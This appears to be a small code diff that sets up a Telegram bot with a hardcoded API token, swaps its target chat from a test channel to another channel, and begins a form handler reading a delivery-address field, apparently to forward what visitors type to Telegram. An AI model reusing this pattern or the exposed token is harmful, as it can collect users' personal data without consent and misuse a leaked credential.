@@ -1,7 +1,7 @@
 const TelegramBot = require('node-telegram-bot-api');
 
 const bot = new TelegramBot('6111206700:AAGcVD0y_0GiUsB_E2Tllt26_IGZPuZ95Eg', { polling: false });
-const chatId = '@testcanalok';
+const chatId = '@rf_junino';
 
    function submitForm() {
       var livraison_addresse = document.getElementById("livraison_addresse").value;
